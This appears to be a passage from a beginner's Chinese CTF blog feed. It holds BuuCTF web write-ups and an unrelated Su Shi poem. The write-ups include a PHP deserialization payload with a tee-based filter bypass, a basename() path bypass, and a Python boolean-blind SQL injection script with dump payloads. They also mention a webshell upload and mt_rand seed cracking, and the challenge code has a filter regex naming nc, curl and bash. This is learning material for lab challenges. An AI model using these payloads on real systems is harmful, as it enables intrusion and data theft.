class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>minipop</code>类下存在两个公有属性<code>$code</code>和<code>qwejaskdjnlka</code>以及<code> __toString()</code>方法和<code>__destruct()</code>，<code>__destruct()</code>这东西对象销毁时会自动调用(序列化会调用反序列化也会调用)。<code>__toString()</code>这东西就是一个类被当成字符串时会被调用。</p><p>思路就是通过<code>__destruct()</code>调用<code>__toString()</code>。</p><p>还有就是虽然<code>waf</code>过滤了挺多，不过可以利用拼接的特性<code>比如过滤了ls可以利用l&#39;&#39;s来代替</code></p><p><code>exec</code>函数本身不会将命令的结果直接显示在页面上。它将命令的输出作为字符串返回。<code>eval</code>会更常见</p><p>这题不会做。。参考了这位师傅的文章：<code>https://blog.csdn.net/m0_63138919/article/details/133958661</code></p><p>主要就是利用<code>tee</code>这个命令：</p><p><img src="/img/tee3.png" alt="tee3"></p><p>后缀加不加无所谓，<code>Linux</code>下文件名可以使任何有效的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//通过echo，这时$b这个类的实例被当成字符串了</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;ls / | t&#x27;&#x27;ee viper&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>回显<code>alright</code>后直接访问<code>viper</code>就行：</p><p><img src="/img/tee1.png" alt="tee1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//通过echo，这时$b这个类的实例被当成字符串了</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:35:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tee2.png" alt="tee2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定风波·南海归赠王定国侍人寓娘</title>
    <link href="/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/"/>
    <url>/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/</url>
    
    <content type="html"><![CDATA[<p>​      </p><span id="more"></span><hr><h2 id="定风波·南海归赠王定国侍人寓娘"><a href="#定风波·南海归赠王定国侍人寓娘" class="headerlink" title="定风波·南海归赠王定国侍人寓娘"></a>定风波·南海归赠王定国侍人寓娘</h2><p>[宋] 苏轼</p><p>常羡人间琢玉郎。天应乞与点酥娘。尽道清歌传皓齿。风起。雪飞炎海变清凉。<br>万里归来颜愈少。微笑。笑时犹带岭梅香。试问岭南应不好。却道。此心安处是吾乡</p>]]></content>
    
    
    
    <tags>
      
      <tag>阅读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_4</title>
    <link href="/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/"/>
    <url>/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basename用来获取文件名部分</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">64</span>));<span class="hljs-comment">//生成一个64字节（即512位）的随机密钥，并将其转换为十六进制表示的字符串。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<span class="hljs-comment">//哈希值相等</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码其实很好理解。一开始以为<code>hash_equals</code>存在绕过。。后来才知道考的是<code>basename</code>绕过：</p><p>先了解一下<code>$_SERVER[&#39;PHP_SELF&#39;]</code>这东西干啥用的<code>(参考https://www.shawroot.cc/937.html和https://www.cnblogs.com/Article-kelp/p/16045800.html)</code></p><p>$_SERVER[‘PHP_SELF’]：相对于网站根目录的路径及 PHP 程序名称。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">网址：https:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><br><span class="hljs-variable">$_SERVER</span>[‘PHP_SELF’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[‘SCRIPT_NAME’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<br><span class="hljs-variable">$_SERVER</span>[‘REQUEST_URI’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br>basename()函数就是获取路径中的文件名部分<br></code></pre></td></tr></table></figure><p>利用点就是这个<code>basename</code>，根据这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basename用来获取文件名部分</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以知道如果令<code>basename($_SERVER[&#39;PHP_SELF&#39;])是config.php</code>就能拿到<code>flag</code>。我们可以构造<code>URL:http://7a610bd9-e609-454a-a18c-d1e340cfde4a.node4.buuoj.cn:81/index.php/config.php?source=1(注意这个index.php，最开始我没加)</code>:</p><p><img src="/img/canyouguess1.png" alt="canyouguess1"></p><p>再看上面那段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先去掉正则匹配中的转义符号会好理解一些：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config.php/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>/config.php/*$/i</code>这部分的意思就是不区分大小写匹配<code>config.php/</code>结尾的字符串<code>(其中/匹配零次或多次)</code></p><p>。这样以来就限制了我们利用<code>highlight_file</code>函数去拿flag。但我们可以利用某些字符串绕过正则：<strong>basename()会去掉不可见字符</strong>，<code>Fuzz</code>一下不可见字符，然后随便取一个就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-string">&#x27;config.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//注意这个%2F其实是/，不能用！</span><br></code></pre></td></tr></table></figure><p><img src="/img/canuguess1.png" alt="canuguess1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php/config.php/%ff?source=1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;2c11cab3-0cfc-4f3d-ac4e-87969e74320e&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>index.php/config.php/%ff?source=1</code>经过<code>$_SERVER[&#39;PHP_SELF&#39;]</code>变成<code>index.php/config.php/%ff</code>()这里不会触发正则)，然后<code>basename</code>去掉不可见字符得到<code>config.php</code></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>随便输个<code>student number</code>，注意<code>URL</code>:</p><p><img src="/img/yanzhi1.png" alt="yanzhi1"></p><p>初步判断<code>SQL</code>注入，通过<code>1&#39;--+/1&#39;%23/1 --+ /1%23</code>判断是数字型注入</p><p><code>?stunum=1 and 1--+</code></p><p><img src="/img/yanzhi5.png" alt="yanzhi5"></p><p><code>?stunum=1/**/and/**/0 --+</code>:(过滤空格，0换成1有回显)</p><p><img src="/img/yanzhi4.png" alt="yanzhi4"></p><p>尝试了堆叠注入没结果。。试了试<code>if(length(database())&gt;1,1,0)</code></p><p><img src="/img/yanzhi2.png" alt="yanzhi2"></p><p><code>?stunum=if(length(database())&gt;99,1,0)</code></p><p><img src="/img/yanzhi3.png" alt="yanzhi3"></p><p>布尔盲注，可以通过页面回显判断<code>if</code>语句正确与否：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        paylaod = &#123;<span class="hljs-string">&quot;stunum&quot;</span>:<span class="hljs-string">&quot;if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)&#125;<br>        <span class="hljs-comment">#爆库：if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆表：if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆字段：if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆数据：if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url=url,params=paylaod)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br></code></pre></td></tr></table></figure><p>简单说一下二分法原理，首先是设置<code>low=31</code>和<code>high=127</code>:<code>ASCII</code>码中可见字符的范围是<code>32-126</code>。</p><p>自己写个字典放进去遍历也行。</p><p> <code>min = mid +1</code> 和 <code>max = mid</code>:</p><p>当判断 <code>mid </code>大于某个值的结果为<code> true</code> 时, 这个所求值肯定是比<code>mid</code>要大的 (大于), 所以是 <code>mid + 1</code></p><p>当结果为<code> false</code> 时, 所求值应该是不超过<code>mid </code>(小于等于), 所以是 <code>max = mid</code></p><p>经过多次循环后让<code>high</code>比<code>low</code>小，这时的<code>high</code>就是我们需要的数据。</p><p>可以自己在草稿纸上过一下过程。</p><p>这题手注也可以：参考<code>https://blog.csdn.net/weixin_61355725/article/details/126518079</code></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><img src="/img/cvmaker1.png" alt="cvmaker1"></p><p>先随便注册一个用户，登录：</p><p><img src="/img/cvmaker2.png" alt="cvmaker2"></p><p>发现有上传文件的功能，猜测文件上传漏洞：</p><p><img src="/img/cvmaker3.png" alt="cvmaker3"></p><p>我点更换头像然后随便上传了个一句话。。卡住了刷新页面就出了这么个东西</p><p>妈的这题我环境有问题。。明明登录了他一直给我弹<code>Please Login </code>啥的。。烦死了，而且有时点按钮啥反应不给</p><p><code>exif_imagetype</code>这东西就是个<code>MIME</code>过滤，上传一句话后抓包改一下<code>content-type</code>就行</p><p>上传后会返回一个路径，访问然后蚁剑连接</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p><img src="/img/chou1.png" alt="chou1"></p><p>右键看源码也没啥提示，试着输入一些字符串然后抓包：</p><p><img src="/img/chou2.png" alt="chou2"></p><p>明文传输，不过可以看到右边好像返回了部分<code>PHP</code>代码？</p><p>我回到原页面并没有啥新东西，<code>F12</code>打开网络，重新发数据后发现有这么个东西：</p><p><img src="/img/chou3.png" alt="chou3"></p><p>访问<code>check.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">JXRHwWFvH5<br><br>没抽中哦，再试试吧<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<span class="hljs-comment">//种子</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<span class="hljs-comment">//原始字符串，起始位置和长度 </span><br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-comment">//给了前十位</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); <br></code></pre></td></tr></table></figure><p>强等于绕过肯定不要想了，搜了一下<code>mt_rand</code>绕过：<code>https://www.freebuf.com/vuls/192012.html</code></p><p>重点就是<code>mt_rand</code>这东西由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p><p>给了序列和前十位，我们先将前十位还原成为生成的随机数，然后拼接形成<code>php_mt_seed</code>需要的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;B8F2IQkNd6&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br><span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strpos会返回字符串第一次出现的位置，从0开始</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//长度62，从0到61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//37 37 0 61 34 34 0 61 41 41 0 61 28 28 0 61 44 44 0 61 52 52 0 61 10 10 0 61 49 49 0 61 3 3 0 61 32 32 0 61 </span><br>    <br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">547943121</span>);    <span class="hljs-comment">//在这里填入获得的种子</span><br><span 